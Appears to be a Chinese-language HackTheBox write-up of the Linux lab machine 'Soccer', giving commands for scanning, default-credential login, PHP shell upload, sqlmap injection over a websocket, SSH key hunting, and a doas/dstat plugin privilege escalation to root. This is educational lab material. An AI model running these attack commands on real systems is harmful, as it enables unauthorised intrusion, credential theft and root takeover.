---
title: "Soccer"
description: "这篇HackTheBox Linux 靶机 Soccer 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Soccer 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-09-12T00:08:44+08:00"
publishDate: "2024-09-12T00:08:44+08:00"
lastmod: "2024-09-12T00:08:44+08:00"
url: "/hackthebox/linux/soccer/"
image: "images/oscp-banners/banner-013.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口扫描

```
sudo nmap -p- 10.10.11.194 -open
```

![image-20240911214051524](https://s2.loli.net/2024/09/11/Oae3cbmEZozlf4G.png)

对开放端口进行进一步探测

```
sudo nmap -p22,80,9091 -A 10.10.11.194 -oX soccer.xml
```

![image-20240911214125837](https://s2.loli.net/2024/09/11/E4hm3yZ5KtuoaB2.png)

![image-20240911214140512](https://s2.loli.net/2024/09/11/ZSMVK4Ymrf1nlWA.png)

22端口无法突破，所以优先从80端口开始

通过扫描获取到二级路径

```
dirsearch -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html
```

![image-20240911221613558](https://s2.loli.net/2024/09/11/gCruXpIQVUiTY9w.png)

通过访问对应页面，发现这啥一个文件管理系统叫做 tiny file manager

通过谷歌搜索到对应的默认账号密码，进行尝试登录

```
Default username/password: admin/admin@123. user/12345
```

admin/admin@123 成功登录系统

![image-20240911221726767](https://s2.loli.net/2024/09/11/RZBaz5h7mcEn8Yo.png)

这里有两个思路，第一个是上传，第二个是修改，优先进行上传尝试

发现在uploads目录下存在上传能力，可以直接上传php

![image-20240911224616954](https://s2.loli.net/2024/09/11/13YzJXSOy5e4dE7.png)

接着我们需要访问链接让能够反弹，这里后面有一个操作按钮可以直接点击

![image-20240911224642183](https://s2.loli.net/2024/09/11/itXJzoQGx9mlZEy.png)

![image-20240911224652078](https://s2.loli.net/2024/09/11/5hnvJedCqVybSlN.png)

成功突破边界，但无法访问player文件夹，上传linpeas.sh检查，发现一个可疑点

![image-20240911231912716](https://s2.loli.net/2024/09/11/ElQp1KGJBRdo2mu.png)

存在一个子域名，soc-player.soccer.htb，在host文件中进行添加

![image-20240911232054844](https://s2.loli.net/2024/09/11/mtxOAPZRjGQMgL6.png)

出现一个新页面，可以进行注册登录，发送你一个ticket

![image-20240911232147168](https://s2.loli.net/2024/09/11/MIO39Wm6bnYuUF2.png)

多次输入感觉此处存在sql注入，进行手动尝试

![image-20240911232455803](https://s2.loli.net/2024/09/11/WTaJmA7rtHScBzN.png)

数字型结果为真，应当是存在的，同时我们发现这是一个websocket，和9001端口连接，此处是盲注完全无法



使用sqlmap进行注入

```
sqlmap -u "ws://soc-player.soccer.htb:9091/" --data '{"id":"*"}' --dump --level 5 --risk 3 --batch
```

![image-20240912000831547](https://s2.loli.net/2024/09/12/6erozPw4sV35lnC.png)



最终能获取到一个账号密码

player：PlayerOftheMatch2022

![image-20240911235022880](https://s2.loli.net/2024/09/11/GHKt2NejCxYhDMR.png)

```
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
```

发现以下内容

![image-20240911235732610](https://s2.loli.net/2024/09/11/JeCyzPZnm1FSA5K.png)

bin下的均无结果，local下的doas通过谷歌搜索得到以下内容

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/

```
find / -type f -name "doas.conf" 2>/dev/null
cat /usr/local/etc/doas.conf
```

![image-20240912000046518](https://s2.loli.net/2024/09/12/PS2ovyI7Z1miAdX.png)

显示可以无密码执行dstat，先查看下帮助文档

/usr/bin/dstat -h

![image-20240912000523301](https://s2.loli.net/2024/09/12/TNFlxLY348t6rKW.png)

```
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_123.py
#但因为dstat是通过doas无密码执行，故需要如下执行
/usr/local/bin/doas -u root /usr/bin/dstat --123
```

![image-20240912000750479](https://s2.loli.net/2024/09/12/L9uMdPqXCfD4kIo.png)

